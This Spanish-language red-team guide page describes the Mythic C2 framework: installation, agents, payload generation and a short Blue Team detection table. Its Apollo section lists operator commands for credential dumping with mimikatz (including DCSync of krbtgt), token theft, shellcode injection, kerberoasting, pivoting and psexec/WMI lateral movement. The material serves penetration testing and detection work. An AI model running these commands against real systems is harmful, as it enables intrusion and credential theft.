---
icon: transmission
---

# Mythic C2

Mythic es un framework de C2 open source desarrollado por @its\_a\_feature\_, diseñado con una arquitectura modular donde el servidor central es agnóstico al agente. Los implantes (llamados **Agents** en Mythic) son plugins independientes que se instalan en el servidor — cada uno tiene su propio lenguaje, protocolo y capacidades. Esta arquitectura permite usar agentes como **Apollo** (Windows, .NET), **Poseidon** (Linux/macOS, Go), **Medusa** (Python) o **Thanatos** (Rust) sobre la misma infraestructura.

Mythic tiene una **interfaz web** completa en lugar de cliente de escritorio, lo que facilita el trabajo en equipo sin instalar nada en las máquinas de los operadores.

### Arquitectura

```
[Operador] → Navegador web → [Mythic Server] ← Agente en el target
```

Mythic corre como un conjunto de contenedores Docker: el servidor principal, la base de datos (PostgreSQL), el servidor web (React) y cada agente/perfil C2 como contenedor independiente.

### Instalación

```bash
# Dependencias: Docker y docker-compose
git clone https://github.com/its-a-feature/Mythic
cd Mythic

# Configuración inicial
sudo ./install_docker_ubuntu.sh   # o debian/centos según distro

# Arrancar Mythic
sudo ./mythic-cli start

# Ver credenciales generadas
sudo ./mythic-cli config get MYTHIC_ADMIN_PASSWORD
```

La interfaz web estará disponible en `https://IP:7443`.

### Instalación de agentes y perfiles C2

```bash
# Instalar agente Apollo (Windows, .NET)
sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo

# Instalar agente Poseidon (Linux/macOS, Go)
sudo ./mythic-cli install github https://github.com/MythicAgents/poseidon

# Instalar perfil C2 HTTP
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http

# Instalar perfil C2 DNS
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/dns

# Ver todo lo instalado
sudo ./mythic-cli status
```

### Agentes disponibles

| Agente       | OS              | Lenguaje  | Características destacadas       |
| ------------ | --------------- | --------- | -------------------------------- |
| **Apollo**   | Windows         | C# (.NET) | BOFs, inject, token manipulation |
| **Poseidon** | Linux / macOS   | Go        | Port forwarding, SOCKS5          |
| **Medusa**   | Windows / Linux | Python    | Scripting flexible               |
| **Thanatos** | Windows / Linux | Rust      | Alta evasión, cifrado fuerte     |
| **Athena**   | Cross-platform  | C#        | P2P, SMB/TCP lateral movement    |
| **Freyja**   | macOS           | Swift     | Específico para macOS            |

### Flujo de operación

Desde la interfaz web de Mythic:

1. **Crear listener**: `C2 Profiles → Start Profile Instance` — seleccionar protocolo (HTTP, DNS, SMB) y configurar puerto, host y opciones de staging.
2. **Generar payload**: `Payloads → Generate New Payload` — seleccionar agente (Apollo, Poseidon…), perfil C2 activo, formato de salida (exe, dll, shellcode) y opciones de configuración.
3. **Gestionar callbacks**: Una vez el agente ejecuta en el target, aparece en `Callbacks`. Desde ahí se interactúa con él mediante la task queue.
4. **Ejecutar tareas**: Las tareas se encolan y el agente las recoge en el siguiente check-in.

### Comandos — Apollo (Windows)

```bash
# Reconocimiento
shell whoami
ps                        # lista de procesos
ls / cd / pwd
cat C:\ruta\archivo

# Ejecución .NET en memoria
execute_assembly SharpHound.exe -c all
execute_assembly Rubeus.exe kerberoast /nowrap
execute_assembly Seatbelt.exe -group=all

# Injection
inject --pid 1234 --shellcode payload.bin
shinject --pid 1234 --shellcode payload.bin   # más sigiloso

# Tokens y privilegios
getprivs                  # listar privilegios del token
steal_token --pid 1234    # robar token de proceso elevado
rev2self                  # revertir token

# Credenciales
mimikatz sekurlsa::logonpasswords
mimikatz lsadump::dcsync /user:krbtgt

# Pivoting
socks5 start --port 1080
rpfwd --lport 13389 --rhost 192.168.1.10 --rport 3389

# Lateral movement
jump psexec --host target --payload apollopayload.exe
jump wmi --host target --payload apollopayload.exe

# Transferencia
download C:\Users\admin\passwords.txt
upload /tmp/herramienta.exe C:\Windows\Temp\
```

### Grafos y análisis

Una de las mejores características de Mythic es la visualización gráfica de operaciones: `Operational Views → Graph` muestra las relaciones entre callbacks, hosts comprometidos y rutas de pivoting, lo que facilita enormemente entender la topología de una red compleja durante un engagement largo.

### Detección — perspectiva Blue Team

| Indicador           | Descripción                                                     |
| ------------------- | --------------------------------------------------------------- |
| Puerto 7443         | Interfaz web del servidor Mythic expuesta                       |
| Contenedores Docker | Mythic corre en Docker — procesos `mythic_*` en el servidor     |
| Staging HTTP        | Patrón de peticiones GET/POST con UUIDs en la URI               |
| Agentes .NET        | Apollo usa reflection y AppDomain para cargar assemblies        |
| Nombres de task     | Los tasks tienen UUIDs únicos — visibles en análisis de tráfico |

> Mythic es especialmente útil en engagements largos y con equipos porque la interfaz web centraliza toda la información: callbacks, tareas, archivos, credenciales capturadas y grafos de red. Es el C2 más orientado a operaciones en equipo de los cubiertos aquí.
